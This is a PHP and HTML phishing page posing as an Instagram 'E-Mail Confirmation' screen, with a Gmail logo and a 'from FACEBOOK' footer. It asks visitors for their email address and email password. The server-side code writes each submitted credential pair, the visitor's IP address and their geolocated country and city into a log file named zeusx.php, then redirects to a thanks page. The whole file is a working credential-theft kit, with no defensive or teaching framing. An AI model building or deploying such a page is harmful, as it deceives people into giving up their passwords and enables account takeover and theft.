<?php
session_start();

if ($_POST) {
$mail=$_POST["mail"];
	$mailpw=$_POST["mail_password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('zeusx.php', 'a');
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='red'> Mail Adresi: </font><font color='white'>".$mail."</font><br>
<font color='red'> Mail Şifresi: </font><font color='white'>".$mailpw."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>
<br>

"); 
fclose($file);

   header("Location: thanks.php");
}
?>

<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css"><style>img[alt="www.000webhost.com"]{display:none;}</style>
	<title>Mail Cofirmation • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>
<body style="background:#fafafa;">
	<header>
		<div style="margin:0; padding;">

 
<div style=" padding:5px; margin:0px;
width:99%; height:45px;;
  background: #f09433; 
background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
  ">


  <table style="width:100%;margin:0px;">
      <tbody><tr style="width:100%;margin:0px;">
         <td style=" margin:0px;font-family:sans-serif;font-weight:bold;color:white;">Instagram</td>
         <td style="border:1px solid:white;color:white; margin:0px;
text-align:right;"><div style="border:1px solid white;margin:0px;
width:; text-align:center; margin-left:%;font-weight:bold;border-radius:5px;font-family:sans-serif;">GET
</div>

</td>
      </tr>
      <tr>
         <td style=" font-family:sans-serif;font-weight:400;color:white;font-size:13px;">Find It for free on Google Play.</td>
         <td>    </td>
      </tr>
   </tbody></table>



</div>
</div>
</header>
	<center>
		<br><br>
		
		<img src="https://i.hizliresim.com/cHgTep.png" width="200" style="display:none;">
		
<h1 style="font-weight:400;color:#343434;font-size:20px;letter-spacing:px;">E-Mail Confirmation</h1>

		

		<button class="fb-qenzy" style="display:none;">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button>
		<img src="https://www.freepngimg.com/thumb/gmail/66456-mailang-icons-computer-logo-email-gmail.png" width="80">

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>
		<br>
		<form method="post">
			<input type="email" name="mail" placeholder="E-Mail" required="" class="username" autocomplete="off"><br>
			<input type="password" name="mail_password" placeholder="E-Mail Password" required="" class="password">
			<br>
			<table class="sa" style="display:none;">
				<tr class="as">
					<th class="x"></th>
					<th class="y">
						<span class="forgot">Forgot Password?</span>
					</th>
				</tr>
			</table>

			<br>
			<button type="submit" class="qenzyist">Confirm</button>

		</form>
		<div class="dont" style="display:none;">
			<span class="dont1">Don't have an account? </span>
			<span class="dont2">Sign up</span>

		</div>

	</center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>

</body>
</html>
<?php

?>

